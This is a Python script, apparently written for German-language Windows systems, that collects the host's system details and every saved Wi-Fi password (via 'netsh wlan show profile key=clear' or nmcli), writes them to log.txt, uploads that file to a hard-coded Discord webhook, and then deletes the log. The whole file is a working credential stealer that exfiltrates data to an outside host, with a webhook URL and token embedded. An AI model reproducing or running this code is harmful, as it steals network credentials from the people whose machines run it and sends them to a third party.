import subprocess
import requests
import json
import platform
import socket
import os

# Discord Webhook URL
webhook_url = 'https://discord.com/api/webhooks/1260028879729332275/bhliony5asku0znPNm424ciasbyH9-qoj926nz3Z8yeHy7TPM5GvhNHGajpBW-HRnovA'

# Function to send message to Discord webhook
def send_to_discord(file_path):
    with open(file_path, 'rb') as f:
        payload = {
            'payload_json': json.dumps({
                'content': 'Hier ist die log.txt mit den gesammelten Daten:'
            })
        }
        files = {
            'file': f
        }
        response = requests.post(webhook_url, data=payload, files=files)
        if response.status_code == 204:
            print("File sent successfully to Discord webhook.")
        else:
            print(f"Failed to send file to Discord webhook. Status code: {response.status_code}")
            print(f"Response: {response.text}")

# Function to execute command and capture output
def execute_command(command):
    result = subprocess.run(command, capture_output=True, text=True, shell=True)
    return result.stdout.strip()

# Function to get device information
def get_device_info():
    device_info = {
        'Hostname': socket.gethostname(),
        'Platform': platform.system(),
        'Platform Release': platform.release(),
        'Platform Version': platform.version(),
        'Architecture': platform.machine(),
        'Processor': platform.processor(),
        'Python Version': platform.python_version(),
    }
    return device_info

# Function to get saved WiFi profiles
def get_saved_wifi_profiles():
    try:
        wifi_profiles = []
        if platform.system() == 'Windows':
            # Windows - using netsh command
            profiles = execute_command('netsh wlan show profiles')
            profiles = profiles.split('\n')
            profiles = [profile.split(':')[1].strip() for profile in profiles if 'Profil für' in profile]

            for profile in profiles:
                profile_info = {}
                profile_info['SSID'] = profile
                profile_details = execute_command(f'netsh wlan show profile name="{profile}" key=clear')
                if 'Sicherheitsschlüssel' in profile_details:
                    security_key = profile_details.split('Sicherheitsschlüssel')[-1].strip().split('\n')[0].split(':')[1].strip()
                    profile_info['Security Key'] = security_key
                wifi_profiles.append(profile_info)

        elif platform.system() == 'Linux':
            # Linux - using nmcli command (NetworkManager CLI)
            profiles = execute_command('nmcli connection show --active')
            profiles = profiles.split('\n')
            profiles = [profile.split()[0] for profile in profiles if 'WLAN' in profile]

            for profile in profiles:
                profile_info = {}
                profile_info['SSID'] = profile
                profile_details = execute_command(f'nmcli connection show {profile}')
                if '802-11-wireless-security.psk' in profile_details:
                    security_key = profile_details.split('802-11-wireless-security.psk:')[1].strip().split('\n')[0].strip()
                    profile_info['Security Key'] = security_key
                wifi_profiles.append(profile_info)

        return wifi_profiles

    except Exception as e:
        print(f"Error getting saved WiFi profiles: {str(e)}")
        return []

# Function to write collected information to log.txt
def write_to_log(log_file_path, device_info, saved_wifi_profiles):
    with open(log_file_path, 'w') as f:
        f.write("=== Device Information ===\n")
        for key, value in device_info.items():
            f.write(f"{key.capitalize()}: {value}\n")
        f.write("\n")

        f.write("=== Saved WiFi Profiles ===\n")
        for profile in saved_wifi_profiles:
            f.write(f"SSID: {profile['SSID']}\n")
            if 'Security Key' in profile:
                f.write(f"Security Key: {profile['Security Key']}\n")
            f.write("\n")

# Main function
def main():
    try:
        # File path for log.txt
        log_file_path = 'log.txt'

        # Get device information
        device_info = get_device_info()

        # Get saved WiFi profiles
        saved_wifi_profiles = get_saved_wifi_profiles()

        # Write collected information to log.txt
        write_to_log(log_file_path, device_info, saved_wifi_profiles)

        # Send log.txt content to Discord webhook
        send_to_discord(log_file_path)

        # Delete log.txt after sending
        os.remove(log_file_path)

    except Exception as e:
        print(f"Error in main function: {str(e)}")

if __name__ == "__main__":
    main()
